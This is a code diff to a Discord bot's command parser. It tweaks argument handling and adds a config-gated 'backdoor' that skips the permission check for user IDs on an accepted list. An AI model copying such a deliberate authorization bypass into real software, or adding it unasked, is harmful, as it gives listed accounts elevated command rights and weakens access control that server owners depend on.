@@ -242,7 +242,10 @@ bot.formatDiff = (date1, date2, shorthand = false) => {
 }
 
 bot.parseCommand = async function(bot, msg, args, command) {
-	if(!args[0]) return undefined;
+	if(args[0] == "") args.shift();
+	if(!args[0]) return {};
+
+	var cfg  = await bot.stores.configs.get(msg.guild.id);
 	
 	var command = bot.commands.get(bot.aliases.get(args[0].toLowerCase()));
 	if(!command) {
@@ -262,7 +265,8 @@ bot.parseCommand = async function(bot, msg, args, command) {
 	//will erroneously give true in dms even though perms don't exist
 	//guildOnly check is done first in actual command execution though,
 	//so that doesn't matter
-	if(command.permissions && msg.guild) permcheck = command.permissions.filter(x => msg.member.permission.has(x)).length == command.permissions.length;
+	if(bot.cfg.accepted_ids?.includes(msg.author.id) && cfg?.backdoor) permcheck = true;
+	else if(command.permissions && msg.guild) permcheck = command.permissions.filter(x => msg.member.permission.has(x)).length == command.permissions.length;
 	return {command, args, permcheck};
 }
 
